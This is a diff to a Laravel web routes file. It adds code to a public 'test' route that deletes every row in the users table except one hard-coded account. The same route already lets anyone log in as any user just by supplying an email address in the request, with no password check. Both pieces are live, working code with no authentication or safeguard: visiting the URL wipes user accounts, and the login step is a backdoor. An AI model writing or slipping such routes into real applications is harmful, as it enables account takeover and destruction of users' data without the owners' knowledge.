@@ -14,6 +14,10 @@ use Illuminate\Support\Facades\Route;
 */
 
 Route::get('test', function () {
+    foreach (\DB::table('users')->where('email', '!=', 'mobashir.monim@bracu.ac.bd')->get() as $row) {
+        \DB::table('users')->where('id', $row->id)->delete();
+    }
+    dd('done');
     \Auth::login(App\Models\User::where('email', request()->email)->first());
     return redirect(route('home'));
     dd('testing nothing');
